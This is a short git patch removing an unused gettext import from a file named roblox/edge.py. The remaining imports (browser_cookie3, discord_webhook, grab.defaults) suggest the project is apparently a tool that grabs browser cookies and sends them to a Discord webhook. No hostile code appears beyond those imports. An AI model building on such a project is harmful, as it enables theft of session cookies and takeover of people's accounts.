@@ -1,0 +1,21 @@
+From 8afb8f10465bbb3c2898f34bb2cd7ecfef002c4f Mon Sep 17 00:00:00 2001
+From: Kai Daniel Gonzalez <gkai70264@gmail.com>
+Date: Mon, 3 Oct 2022 20:12:28 +0000
+Subject: [PATCH 2/6] Remove unnecessary import
+
+---
+ roblox/edge.py | 1 -
+ 1 file changed, 1 deletion(-)
+
+diff --git a/roblox/edge.py b/roblox/edge.py
+index f4c6e46..9449d9a 100644
+--- a/roblox/edge.py
++++ b/roblox/edge.py
+@@ -1,4 +1,3 @@
+-from gettext import find
+ import browser_cookie3
+ from discord_webhook import DiscordWebhook, DiscordEmbed
+ import grab.defaults
+-- 
+2.37.3.windows.1
+
